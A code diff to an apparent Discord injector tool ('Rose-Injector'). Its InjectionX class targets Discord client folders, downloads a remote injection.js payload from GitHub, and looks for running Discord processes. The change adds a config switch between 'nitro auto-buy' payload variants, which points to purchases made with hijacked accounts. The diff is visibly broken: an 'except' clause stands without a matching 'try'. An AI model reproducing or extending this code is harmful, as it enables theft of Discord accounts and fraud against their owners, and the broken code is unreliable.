@@ -1,3 +1,5 @@
+from config import Config
+cc = Config()
 import requests 
 import psutil
 import re 
@@ -14,7 +16,12 @@ class InjectionX:
             self.appdata + '\\DiscordPTB',
             self.appdata + '\\DiscordDevelopment'
         ]
-        self.code = requests.get('https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/injection/injection.js').text
+        if cc.get_nitro_auto_buy() is True:
+            self.code = requests.get('https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/injection/auto_buy__TRUE__injection.js').text
+        if cc.get_nitro_auto_buy() is False:
+            self.code = requests.get('https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/injection/auto_buy__FALSE__injection.js').text
+        except Exception:
+            self.code = requests.get('https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/injection/auto_buy__FALSE__injection.js').text
 
         for proc in psutil.process_iter():
             if 'discord' in proc.name().lower():
